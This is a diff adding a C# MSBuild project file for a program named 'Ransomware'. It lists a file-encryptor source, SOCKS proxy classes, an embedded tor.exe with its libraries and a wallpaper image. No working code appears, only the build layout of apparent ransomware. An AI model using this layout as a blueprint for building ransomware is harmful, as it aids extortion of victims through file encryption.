@@ -1,0 +1,91 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{FDC2A775-F364-4D10-95B6-50C329BAA6C6}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <RootNamespace>Ransomware</RootNamespace>
+    <AssemblyName>Ransomware</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>joint.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="SistemFonk\API.cs" />
+    <Compile Include="SistemFonk\DosyaSifreleyici.cs" />
+    <Compile Include="Webİşlev\SOCKS\ISOCKS.cs" />
+    <Compile Include="Webİşlev\SOCKS\SOCKS.cs" />
+    <Compile Include="Webİşlev\SOCKS\SOCKS4.cs" />
+    <Compile Include="Webİşlev\SOCKS\SOCKS4a.cs" />
+    <Compile Include="Webİşlev\SOCKS\SOCKS5.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="libcrypto-1_1.dll" />
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="tor.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="libevent-2-1-7.dll" />
+    <EmbeddedResource Include="libevent_core-2-1-7.dll" />
+    <EmbeddedResource Include="libevent_extra-2-1-7.dll" />
+    <EmbeddedResource Include="libgcc_s_sjlj-1.dll" />
+    <EmbeddedResource Include="libssl-1_1.dll" />
+    <EmbeddedResource Include="libssp-0.dll" />
+    <EmbeddedResource Include="libwinpthread-1.dll" />
+    <EmbeddedResource Include="zlib1.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="joint.ico" />
+    <EmbeddedResource Include="wallpaper.jpg" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
